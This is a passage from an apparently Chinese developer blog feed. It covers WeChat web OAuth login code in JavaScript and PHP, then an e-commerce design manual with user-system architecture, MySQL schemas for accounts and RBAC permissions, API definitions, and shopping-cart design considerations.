使用location.href或location.search是可以从URL中提取到GET参数的，代码如下： 1234567891011var getQueryVariable = (variable) =&gt; &#123; var query = window.location.search.substring(1); var vars = query.split("&amp;"); for (var i = 0; i &lt; vars.length; i++) &#123; var pair = vars[i].split("="); if (pair[0] === variable) &#123; return pair[1]; &#125; &#125; return false;&#125; 回到正题，我们知道用户同意授权后，微信重定向时将code和state作为参数加到redirect_url链接上，也就是如下形式： redirect_url?code=001EX7O42pPubS00IvO42KtjO42EX7O8&amp;state 处理过程如下： 1、我们将redirect_url定向到前端静态处理的页面A 1234567A.html// 获取授权urlwindow.auth = (type) =&gt; &#123; http('wxAuthUrl', &#123;type: type, callback: location.href //A.html&#125;, (response) =&gt; &#123; location.href = response.data; &#125;)&#125; 对应的后端接口: 12345678910111213141516171819/** * 获取授权地址 * @request('/wxAuthUrl') * @param array $request * @return array */public function wxAuthUrl(array $request)&#123; $callback = urlencode($request['callback']);// redirect_url $state = @$request['type']; // 根据这个值判断授权范围scope if (1 == $state) &#123; $scope = "snsapi_userinfo"; &#125; else &#123; $scope = "snsapi_base"; &#125; $url = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx552593a8e7c4b0de&amp;redirect_uri=&#123;$callback&#125;&amp;response_type=code&amp;scope=&#123;$scope&#125;&amp;state=&#123;$state&#125;#wechat_redirect"; return $this-&gt;response(0, 'success', $url);&#125; 2、页面A接收到code值以后，传递给后台 12345678910A.htmlwindow.onload = () =&gt; &#123; let code = getQueryVariable('code'), state = getQueryVariable('state'); // 获取到微信传递的code和state if (code) &#123; http('wxCall', &#123;code: code, state: state&#125;, (response) =&gt; &#123;// 返回给后端处理 document.getElementById('content').innerHTML = JSON.stringify(response.data); &#125;) &#125;&#125; 3、后台通过code执行授权步骤2。 12345678910111213141516171819202122/** * 微信授权回调，原来是作为redirect_url使用的，现在修改下返回值即可满足新需求 * @request('/wxCall') * @param array $request * @return array */public function wxCall(array $request)&#123; try &#123; // code-&gt;access_token $ret = json_decode(file_get_contents("https://api.weixin.qq.com/sns/oauth2/access_token?appid=" . self::APPID . "&amp;secret=" . self::SECRET . "&amp;code=&#123;$request['code']&#125;&amp;grant_type=authorization_code"), true); // access_token-&gt;profile if (1 == $request['state']) &#123; $ret = json_decode(file_get_contents("https://api.weixin.qq.com/sns/userinfo?access_token=&#123;$ret['access_token']&#125;&amp;openid=&#123;$ret['openid']&#125;&amp;lang=zh_CN"), true); &#125; // header("location: success.html"); return $this-&gt;response(0, 'success', $ret); &#125; catch (\Exception $e) &#123; // header("location: fail.html"); return $this-&gt;response(4000, $e-&gt;getMessage()); &#125;&#125; 这样一来，整个交互过程便统一了, 效果如下： 演示地址：https://app.ya2.top/wxauth/ (建议在微信环境打开)源码地址：https://github.com/gouyuwang/wxauth/]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>微信登录</tag>
        <tag>网页授权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电商设计手册]]></title>
    <url>%2Farticles%2F%E7%94%B5%E5%95%86%E8%AE%BE%E8%AE%A1%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[前言一直从事互联网电商开发三年多的时间了，回头想想却对整个业务流程不是很了解，说出去很是惭愧。但是身处互联网电商的环境中，或多或少接触了其中的各个业务，其次周边还有很多从事电商的同事和朋友，这都是资源。于是，我决定和我的同事、盆友们、甚至还有你们去梳理整个流程并分享出来，谈不上结果要做的多么好，至少在每一个我们有能力去做好的地方，一定会细致入微。 除此之外，同时为了满足我们自身在工作中可能得不到的技术满足感，我们在做整个系统设计的过程中，会去使用我们最想用的技术栈。技术栈这一点我们借助docker去实现，所以最终的结果：一方面我们掌握了业务的东西，另一方面又得到了技术上的满足感，二者兼得。 最后，出于时间的考虑，我们提出了一个想法Do design No code。【只设计不码码】 这句话的意思：最终我们设计出来整个系统的数据模型，接口文档，甚至交互过程，以及环境部署等，但是最后我们却不写代码。是吧？如果这样了写代码还有什么意义。当然，也不全是这样，出于时间的考虑当然也会用代码实现出来的，说不定最后正是对面的你去实现的。 其次，这些内容肯定有考虑不全面或者在上规模的业务中存在更复杂的地方，欢迎指出，我们也希望学习和分享您的经验。 技术栈选型123456789101112131415161718192021222324252627282930313233343536373839- 基础环境 + k8s + docker- 存储 + mysql + redis * codis * redis主从- queue + kafka + rocketmq + rabbitmq- gw + kong + zuul- webserver + nginx/openresty + envoy- server + go + php- frontend + vue- rpc + grpc + thrift- 基础能力 + 监控 * zipkin * elk * falcon + 服务发现 * zookeeper * etcd + 持续集成 * ci/cd- 搜索 + es + solr 代码仓库请您耐心等待… 用户体系今天，我们开始第一部分用户体系的设计。本文分为如下四大模块： 架构设计 数据模型设计 交互设计 接口设计 架构设计简单来看用户体系当你第一次接触和用户相关的互联网产品时，或者曾今在我眼里。用户体系无非就是“登录”和“注册”，“修改用户信息”这些，等。简单来做的话，无非我们需要一张表去记录用户的身份信息：注册时(insert操作)，往表里插入一个数据；登录时(select&amp;update操作)，通过用户标识(手机号、邮箱等)判断用户的密码是否正确；修改用户信息(select&amp;update操作)，就是直接update这个uid的用户信息(头像、昵称等)。 这样设计的确没什么问题，很简单不是么。但是随着业务的发展，一方面我们需要提供统一的用户管理(高内聚)，又要提高系统的可扩展性，所以我想呈现出来的是我理解的一个基本用户体系应该有的东西。 一个基本用户体系应该有的东西首先我们对原有的用户表进行再一次的抽象(抽离用户注册、登录依赖的字段、第三方登录) -&gt; 账户表，为什么这么做？随着业务的发展，以前只维护一个产品，也许某一天又开发新的产品，这样我们就可以统一的维护我们公司所有产品的注册登录逻辑，不同的产品只维护该产品和用户相关的信息即可(具体依赖产品形态)。如下图所示： 上图中，还提到了第三方登录/员工表/后台权限管理，这些都是一些用户体系基本必备的结构。 第三方登录：第三方也是登录方式的一种，我们也把它抽象到账户的一部分，如上图所示。其次，关于第三方登录这里存在一个交互方式设计存在的问题，后面交互设计时会提到。 员工：因为上面我们抽离了账户表，所以内部的管理系统后台也可以统一的使用账户表的登录逻辑，这样全公司在账号这个事情上达到了真正的高内聚。 提到了员工，我们的内部各种系统后台肯定涉及各种的权限管理，所以这里提到了简单的RBAC(基于角色的权限控制)，具体的逻辑数据模型设计会提到。 最终的架构随着业务产品形态的越来越复杂，在设计架构的时候，我们需要分析其中的变与不变： 变：越来越多的产品个性化用户需求 不变：注册登录的逻辑 最终的结果，我们把原有的用户拆成了账户和用户，同时我们也要在这里明确这两个概念的区别： 账户：整个体系唯一生产uid的地方，内聚注册登录逻辑，不涉及产品业务需求 用户：不同产品个性化的用户需求信息 最终的架构图如下： 第一部分：账户(服务层) 第二部分：用户(应用层，无限水平扩展) 第三部分：员工(应用层，员工权限体系) 数据模型设计对应上面的架构，我们很容易设计出我们的数据模型(这里假设我们目前只有一个对C端的应用)： 123账户 -&gt; 1.账户表用户 -&gt; 2.用户表员工 -&gt; 3.员工表 除了上面三张表外，还需要我们的R(role)B(base)A(access)C(control)权限管理,RBAC基于角色的权限管理大家应该很熟悉，这里我就不详细说了，简单的RBAC首先需要： 12344.系统菜单表(菜单即权限)，系统的uri路径5.权限表(菜单即权限)，具体的权限就是访问系统的菜单6.角色表，一个角色具有哪些权限7.员工和角色的关联表，一个员工属于哪个角色 好了一个简单的RBAC涉及的表基本罗列出来了，但是在我的工作经历中大家实现的权限管理往往只针对某个系统，这样对于众多的系统后台来说就是乱、重复造轮子、权限管理效率低。所以我在上面的架构设计中把权限作为了一个服务为全系统提供基础服务能力。而达到这个目的的结果我只需要再增加一张表： 18.后台管理系统表, 登记所有的后台管理系统(这样通过系统id和系统资源uri的id就可以全局构成唯一性，单纯的uri存在重复的可能性，用uri不用url的原因是域名存在变动的可能性) 最后我们的用户体系应该基本就上面8张表。咦，貌似漏掉了第三方登录，我们加上吧，很简单如下： 19. 第三方用户登录表，记录不同第三方的用户标示 最最后就是上面的9张表了，具体的表结构和sql如下： 账户模型 1234567891011121314151617181920212223242526272829303132333435-- 账户模型CREATE TABLE `account_user` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '账号id', `email` varchar(30) NOT NULL DEFAULT '' COMMENT '邮箱', `phone` varchar(15) NOT NULL DEFAULT '' COMMENT '手机号', `username` varchar(30) NOT NULL DEFAULT '' COMMENT '用户名', `password` varchar(32) NOT NULL DEFAULT '' COMMENT '密码', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `create_ip_at` varchar(12) NOT NULL DEFAULT '' COMMENT '创建ip', `last_login_at` int(11) NOT NULL DEFAULT '0' COMMENT '最后一次登录时间', `last_login_ip_at` varchar(12) NOT NULL DEFAULT '' COMMENT '最后一次登录ip', `login_times` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`), KEY `idx_email` (`email`), KEY `idx_phone` (`phone`), KEY `idx_username` (`username`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='账户';-- 第三方账户CREATE TABLE `account_platform` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id', `uid` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '账号id', `platform_id` varchar(60) NOT NULL DEFAULT '' COMMENT '平台id', `platform_token` varchar(60) NOT NULL DEFAULT '' COMMENT '平台access_token', `type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '平台类型 0:未知,1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter', `nickname` varchar(60) NOT NULL DEFAULT '' COMMENT '昵称', `avatar` varchar(255) NOT NULL DEFAULT '' COMMENT '头像', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', PRIMARY KEY (`id`), KEY `idx_uid` (`uid`), KEY `idx_platform_id` (`platform_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='第三方用户信息'; 用户模型 1234567891011121314-- 用户模型CREATE TABLE `skr_member` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '用户id', `uid` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '账号id', `nickname` varchar(30) NOT NULL DEFAULT '' COMMENT '昵称', `avatar` varchar(255) NOT NULL DEFAULT '' COMMENT '头像(相对路径)', `gender` enum('male','female','unknow') NOT NULL DEFAULT 'unknow' COMMENT '性别', `role` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '角色 0:普通用户 1:vip', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', PRIMARY KEY (`id`), KEY `idx_uid` (`uid`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='账户信息'; 员工模型 123456789101112131415161718-- 员工表CREATE TABLE `staff_info` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '员工id', `uid` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '账号id', `email` varchar(30) NOT NULL DEFAULT '' COMMENT '员工邮箱', `phone` varchar(15) NOT NULL DEFAULT '' COMMENT '员工手机号', `name` varchar(30) NOT NULL DEFAULT '' COMMENT '员工姓名', `nickname` varchar(30) NOT NULL DEFAULT '' COMMENT '员工昵称', `avatar` varchar(255) NOT NULL DEFAULT '' COMMENT '员工头像(相对路径)', `gender` enum('male','female','unknow') NOT NULL DEFAULT 'unknow' COMMENT '员工性别', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', PRIMARY KEY (`id`), KEY `idx_uid` (`uid`), KEY `idx_email` (`email`), KEY `idx_phone` (`phone`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='员工信息(这里列了大概的信息，多的可以垂直拆表)'; 系统权限管理模型 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576-- 权限管理: 系统mapCREATE TABLE `auth_ms` ( `id` smallint(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id', `ms_name` varchar(255) NOT NULL DEFAULT '0' COMMENT '系统名称', `ms_desc` varchar(255) NOT NULL DEFAULT '0' COMMENT '系描述', `ms_domain` varchar(255) NOT NULL DEFAULT '0' COMMENT '系统域名', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`), KEY `idx_domain` (`ms_domain`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='系统map(登记目前存在的后台系统信息)';-- 权限管理: 系统menuCREATE TABLE `auth_ms_menu` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id', `ms_id` smallint(11) unsigned NOT NULL DEFAULT '0' COMMENT '系统id', `parent_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '父菜单id', `menu_name` varchar(255) NOT NULL DEFAULT '0' COMMENT '菜单名称', `menu_desc` varchar(255) NOT NULL DEFAULT '0' COMMENT '菜描述', `menu_uri` varchar(255) NOT NULL DEFAULT '0' COMMENT '菜单uri', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `is_show` enum('yes','no') NOT NULL DEFAULT 'no' COMMENT '是否展示菜单', `create_by` int(11) NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`), KEY `idx_ms_id` (`ms_id`), KEY `idx_parent_id` (`parent_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='系统menu';-- 权限管理: 系统权限CREATE TABLE `auth_item` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id', `ms_id` tinyint(11) unsigned NOT NULL DEFAULT '0' COMMENT '系统id', `menu_id` varchar(255) NOT NULL DEFAULT '0' COMMENT '页面/接口uri', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`), KEY `idx_ms_menu` (`ms_id`, `menu_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='系统权限';-- 权限管理: 系统权限(权限的各个集合)CREATE TABLE `auth_role` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id', `name` varchar(255) NOT NULL DEFAULT '0' COMMENT '角色名称', `desc` varchar(255) NOT NULL DEFAULT '0' COMMENT '角描述', `auth_item_set` text COMMENT '权限集合 多个值,号隔开', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='员工角色';-- 权限管理: 角色与员工关系CREATE TABLE `auth_role_staff` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id', `staff_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '员工id', `role_set` text COMMENT '角色集合 多个值,号隔开', `create_at` int(11) NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 1:enable, 0:disable, -1:deleted', PRIMARY KEY (`id`), KEY `idx_staff_id` (`staff_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='权限角色与员工关系'; 交互设计 友情提示：一大波图片即将到来，此处图片较多，不清楚的可点击大图查看 注册注册成功之后存在至少两种交互方式： 注册成功 -&gt; 跳转到登录页面 注册成功 -&gt; 自动登录 -&gt; 跳转到应用首页(或者其他页面) 具体交互流程如下： 登录普通登录 快捷登录快捷登录的流程基本和上面一致只是验证密码换成了验证验证码。 第三方登录第三方登录的交互其实存在这样的问题： 第三方账户登录成功后还需要绑定手机号/Email吗？ 因为我发现有些PM为了提高用户使用的简单快捷性，往往第三方登录成功后会直接产生uid，而不进行账号的绑定。这样之后在再进行账号绑定就涉及账号合并的问题，很麻烦(如果有钱包等)。如果我们一开始就进行绑定操作，这样未来账号的关系就清晰明了便于维护，第三方登录其实就相当于普通账号的别名。最后这个事情做不做的结果就是，账户表account_user和第三方用户信息表account_platform是的一对多还是一对一的关系。 如果绑定，已经注册的手机号/Email是否可以绑定？ 这个还好说，一般来说绑定的选择基本是正确的。最后具体的流程图如下： 交互界面图如下： 后台权限管理首先，我们的后台管理系统需要个响亮的称号，想了一会以前公司用过apollo,于是我准备用mars但突然冒出来个earth，地球万物之根，刚好我们这又是个全业务的基础服务管理系统，哈哈就这样吧～ Earth System Earth System的权限管理功能主要分为以下四部分： 系统管理(The manage system page) 编辑页面 列表页面 菜单管理(The menu page) 编辑页面 列表页面 角色管理(The role page) 编辑页面 列表页面 员工与角色关联管理(The role staff map page) 编辑页面 列表页面 具体交互如下： 接口设计应用层接口(对外)1.注册接口 请求参数： 字段 类型 是否必传 描述 username string 非必传 用户账号 email string email/phone两者择一 用户邮箱 phone string email/phone两者择一 用户手机号 code int 必传 验证码 交互方式一(跳转到登录页面)响应内容： 12345&#123; "code": "200", "msg": "OK", "result": []&#125; 交互方式二(跳转到首页页面)响应内容： 123456789101112&#123; "code": "200", "msg": "OK", "result": &#123; "s_token": "string, 用户会话标示", "s_token_expire": "string, 用户会话标示过期时间，0不过期", "username": "string, 用户名", "nickname": "string, 用户昵称", "avatar": "string, 用户头像", "gender": "string, 用户性别，male:男，female:女，other:未知", &#125;&#125; 2.登录接口 请求参数： 字段 类型 是否必传 描述 username string username/email/phone三者择一 用户账号 email string username/email/phone三者择一 用户邮箱 phone string username/email/phone三者择一 用户手机号 password string 必传 密码 响应内容： 1234567891011&#123; "code": "200", "result": &#123; "s_token": "string, 用户会话标示", "s_token_expire": "string, 用户会话标示过期时间，0不过期", "nickname": "string, 用户昵称", "username": "string, 用户名", "avatar": "string, 用户头像", "gender": "string, 用户性别，male:男，female:女，other:未知", &#125;&#125; 3.快捷登录接口 请求参数： 字段 类型 是否必传 描述 email string email/phone两者择一 用户邮箱 phone string email/phone两者择一 用户手机号 code int 必传 验证码 响应内容： 1234567891011&#123; "code": "200", "result": &#123; "s_token": "string, 用户会话标示", "s_token_expire": "string, 用户会话标示过期时间，0不过期", "nickname": "string, 用户昵称", "username": "string, 用户名", "avatar": "string, 用户头像", "gender": "string, 用户性别，male:男，female:女，other:未知", &#125;&#125; 4.第三方登录接口 请求参数： 字段 类型 是否必传 描述 type string 必传 平台类型 1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter platform_id string 必传 第三方平台用户ID platform_token string 必传 第三方平台令牌 响应内容： 1234567891011&#123; "code": "200", "result": &#123; "s_token": "string, 用户会话标示", "s_token_expire": "string, 用户会话标示过期时间，0不过期", "username": "string, 用户名", "nickname": "string, 用户昵称", "avatar": "string, 用户头像", "gender": "string, 用户性别，male:男，female:女，other:未知", &#125;&#125; 5.用户信息修改接口 请求参数： 字段 类型 是否必传 描述 username string 非必传 用户账号 nickname string 非必传 昵称 avatar string 非必传 头像url gender string 非必传 用户性别，male:男，female:女，other:未知 响应内容： 123456789&#123; "code": "200", "result": &#123; "username": "string, 用户名", "nickname": "string, 用户昵称", "avatar": "string, 用户头像", "gender": "string, 用户性别，male:男，female:女，other:未知", &#125;&#125; 6.用户登录状态校验 请求参数： 字段 类型 是否必传 描述 s_token string 必传 用户会话标示 响应内容： 123456&#123; "code": "200", "result": &#123; "s_token_expire": "string, 用户会话标示过期时间，0不过期， -1登录失效", &#125;&#125; 服务接口(基础服务，对内)账户服务： 注册 请求参数： 字段 类型 是否必传 描述 username string 非必传 用户账号 email string email/phone两者择一 用户邮箱 phone string email/phone两者择一 用户手机号 交互方式一(跳转到登录页面)响应内容： 1234567&#123; "code": "200", "msg": "OK", "result": &#123; "uid": "string, 账户ID" &#125;&#125; 登录 请求参数： 字段 类型 是否必传 描述 username string 非必传 用户账号 email string email/phone两者择一 用户邮箱 phone string email/phone两者择一 用户手机号 password string 必传 密码 响应内容： 1234567&#123; "code": "200", "msg": "OK", "result": &#123; "uid": "string, 账户ID" &#125;&#125; 第三方登录 请求参数： 字段 类型 是否必传 描述 type string 必传 平台类型 1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter platform_id string 必传 第三方平台用户ID platform_token string 必传 第三方平台令牌 响应内容： 12345678&#123; "code": "200", "result": &#123; "uid": "string, 账户ID", "nickname": "string, 用户昵称", "avatar": "string, 用户头像", &#125;&#125; 权限服务 获取系统菜单 请求参数： 字段 类型 是否必传 描述 ms_id string 必传 系统ID 响应内容： 12345678910111213141516171819202122232425262728&#123; "code": "200", "msg": "OK", "result": &#123; "ms_name": "string, 系统名称", "ms_desc": "string, 系描述", "ms_domain": "string, 系统域名", "list": [ &#123; "parent_id": "string, 父菜单ID", "menu_id": "string, 菜单ID", "menu_name": "string, 菜单ID", "menu_desc": "string, 菜描述", "menu_uri": "string, 菜单uri", "child" : [ &#123; "parent_id": "string, 父菜单ID", "menu_id": "string, 菜单ID", "menu_name": "string, 菜单ID", "menu_desc": "string, 菜描述", "menu_uri": "string, 菜单uri", "child" : [] &#125; ] &#125; ] &#125;&#125; 权限校验 请求参数： 字段 类型 是否必传 描述 menu_id string 必传 菜单ID 响应内容： 12345&#123; "code": "200", "msg": "OK", "result": []&#125; 购物体系购物车服务对于一个电商来讲，购物车是整个购买流程最重要的一步。因为电商发展到今天购物车不仅仅只是为了完成打包下单的功能；也是收藏、对比、促销提醒、相关推荐的重要展示窗口。如此多的能力我们该如何设计保证购物车的高性能、以及良好的扩展能力来满足未来的发展呢？ 今天开始我们就以一个假定的场景来输出一个购物车设计：某某电商平台，是一个多租户模式（我们前面的诸多设计都是多租户模式），用户可以把商品加入到购物车，并切按照商户纬度来展示、排序。当然购物车也支持常规的各种操作：选择、删除、清空、商品失效等。并且有相关的促销能够提醒用户。同时为了监控、运营，要支撑购物车数据同步到监控、数仓等能力。 本文会从用户使用的角度以及服务端两个角度来讲解系统的能力。本篇我们的主要目的是说清楚购物车的能力以及一些逻辑。下一篇会进行购物车模型设计以及接口定义。 用户视角我们先来定义一下在用户侧用户操作购物车的功能有哪些？ 一个购物车基本的能力基本上都在上图中，下面我们一一来分解。 操作我们从用户的角度来看，购物车对于用户来说可以添加商品到购物车（加购物车、立即购买都属于一种添加方式）；加入进购物车后，不想要了可以删除该商品（删一个、删多个、清空）；想多买可以修改购买数量，发现钱不够可以减少购买数量；或者发现红色的比白色更漂亮，可以在购物车方便的进行更换规格；对于一些价格很贵的商品，能够在购物车添加一些保障服务（其实是绑定的虚拟商品）；在要去结算的时候，还会提供选择能力让用户决定哪些商品真的本次要购买。 通过上面的描述我们可以看到这个过程是有其内在联系的。这里说一下关于选中功能，业界有两种做法，各有优劣，我们来看一下。淘宝的产品选中状态是保存在客户端的，并且默认不选中，刷新、重新打开APP状态会消失；京东、苏宁这一类是保存在服务端，会记录用户选中状态。针对这两种情况各有优劣。 客户端： 性能，选中/不选中的逻辑直接放在本地做，减少网络请求 体验，多端不能同步，但是购物车相对来说更像是一个收藏夹，每次用户自己选择也无可厚非 计算，价格计算时需要上传本地选中商品（也可以本地计算） 实现，主要靠客户端实现，与服务端无关，研发解耦合 服务端： 性能，每次操作选中都需要调用服务端，而该操作可能很频繁，除了网络损耗，服务端也需要考虑该如何快速找到修改的商品 体验，多端同步状态，记录历史状态 计算，服务端可获取数据，请求时无须上传额外数据 实现，服务端与客户端需要商定如何交互，以及返回数据（每次选中会导致价格变化），耦合在一起 个人认为这两种方式并无谁具备明显优势，完全是一种基于业务模式以及团队情况来做选择。我们这里后续的设计会基于在服务端保存商品选中状态。 在整个操作逻辑中，有个两个比较重要的地方单独说明一下：购买方式与购物车内修改购买属性 购买方式 主要的购买方式有立即购买、加入购物车、拼团购三种方式。 首先普通的加入购物车没什么太多要说的。重点来看下立即购买与拼团。 立即购买在于操作上来说就是选择商品后直接到了订单确认页面，没有购物车中去结算这一步。但是它的实现却可以依赖购物车的逻辑来做，我们来看一下使用购物车与不使用购物车实现这个逻辑有什么差别？ 如果使用购物车来实现，也就是用户点击立即购买时，商品本质上还是加入到购物车中，但这个购物车却与原型的购物车不同，因为该购物车只能加一个商品，并且每次操作都会被覆盖。在视角效果上也是直接从商品详情页面跳转到订单确认页面。来看看这种方式的好处 与购物车在订单确认、下单逻辑上一致，内部可以直接通过购物车获取数据 需要一个独立的专门用于一键购买的购物车来实现，内存有消耗 另外一种实现方式使用一个新的数据结构，因为一般来说一键购买更简单，它只需要商品信息、价格信息即可。每次交互均可以根据sku_id来获取。 订单确认、下单逻辑上需要进行改造，每次请求之间要传递约定参数 节省内存，上下交互通过sku_id来保证 我们会采用使用在服务端一键购买以独立的购物车形式来实现。购物车的数据模型一致，保证了后续处理流程上的一致。 对于拼团，他其实分为两部分，首先是开团这个动作，当团成立后。我们可以选择将成团的商品加入普通购物车，同时可以加购其它商品。也可以选择将成团商品加入一键购买的购物车，保证成团商品只能买一个。拼团模式更像是加入购物车的一个前置条件。本质上它对于购物车的设计没有影响。 购物车内修改购买属性 这里主要是指可以在购物车便捷的操作一些需要在spu纬度操作的事情，比如：变更规格（也就是更换sku），以及选择绑定到spu纬度的服务（保险、延保等）。 我们重点说一下选择绑定的服务。例如：我们买一个手机，厂家提供了延保、各种其它附加服务，一般情况这种服务都是虚拟商品。但是这有个特殊情况。这些保障服务首先不能单独购买，其次他是跟主商品的数量息息相关。比如买两个手机，如果选择了加购服务，那么这些服务的数量必须是2，这会是一个联动关系。 这些保障服务是不能进行单独购买的，它一定要跟特定的商品捆绑销售。 服务端在存储这部分数据时一定需要考虑如何保存这种层级关系，这部分我们后面模型设计的时候大家会看到。 提醒促销提醒很简单，返回的购物车数据，每一个商品应该携带当前的促销信息。这部分重点在于怎么获取促销信息，会在服务端看到。 然后说下购物车数量的提醒，也就是显示当前购物车商品的数量。一般来说进入到APP就会调用一个接口，获取用户的未读消息数、购物车商品数等。这里是需要非常高的读取速度。那么这种需求该如何满足呢？ 方案一： 我们可以设计一个结构保存了用户相关的这种提醒信息数量，每次直接读取这个数据即可。不需要去跟消息服务、购物车服务打交道拿这些数据。 方案二： 在消息、购物车的模型中均设计一个保存总数量的字段，在读取数据的接口中，通过并发的方式调用这些服务拿到数据后进行聚合，这样在速度上只取决于最慢的服务。 这里我们的设计会采用 方案二，因为这样在某种程度上效率可以得到保证，同时整个系统的结构数据的一致性更容易得到保障。当然这里有个细节一定要注意，并发读取一定要设计超时，不要因为某个服务读数问题而导致拖累整个接口的性能。 接下来再来看看促销，这部分除了提醒，还需要提供对应的入口，让用户完成促销的操作。比如说某个商品有券，那么可以直接提供入口去领取；可凑单，有入口进入凑单列表并选择商品等。这部分需要解决的问题是服务端该如何及时从商品纬度拿到这些促销活动。 从用户的视角看完了，我们再来站在研发的角度看看服务端有哪些事情要做 研发视角还是先来看看需求的汇总图： 存储对于存储，首选肯定是内存存储，至于要不要落库，我觉得没有必要。说下我的理由： 购物车的数据相对变化非常频繁，落库成本比较高，如果异步方式落库，很难保障一致性 极端情况，cache奔溃了，仅仅需要用户重新加入购物车，并且我们可以通过cache的持久化机制来保证数据的恢复 所以对于购物车，我们只会把数据完全保存在内存中。 商品销售类型发生变化现在我们来讨论 商品销售类型发生变化 这个问题。这是什么意思呢？大家想一下：比如我把A商品加入到购物车，但是一直没有结算。这时运营说针对A商品搞一个活动，拿出10个库存5折购。那么问题来了，对于之前购物车中就有该商品的用户该如何处理？这里解决的主要问题是：购物车有该商品的用户不能直接以5折买。几种方案，我们来看一下： 方案一： 促销配置后，所有购物车中有该商品的用户失效或删除，这个方案首先被pass，操作成本太高，并且用户体验差 方案二： 购物车中要区分同一个SKU，不同销售类型。也就是说在我们的购物车中不是按照SKU的纬度来加商品，而是通过 SKU+售卖类型 来生成一个唯一识别码。 可以看到 方案二 解决了同一个sku在购物车并存的问题，并且库存之前互相不影响。不过这里又有一个问题？商品的售卖类型（或者说这个标记），该怎么什么地方设置？好像商品系统可以设计、促销系统也可以设置。我们的逻辑中会在促销系统中进行配置。因为商品属于基础逻辑，如果一改就是全局库存受到影响。活动结束后很难做到自动正常售卖。因此这个标记应该落到活动中进行设置（活动设置时会通过促销系统获取该商品之前的活动是否互斥，以确保配置的活动不会互相矛盾）。 依赖系统购物车系统依赖了非常多的其它系统。 商品系统 库存系统 促销系统 结算系统 这些依赖的系统，有的是为了传输数据，有的是为了获取数据。我们按照这两个纬度来看一下。 促销提醒与计算 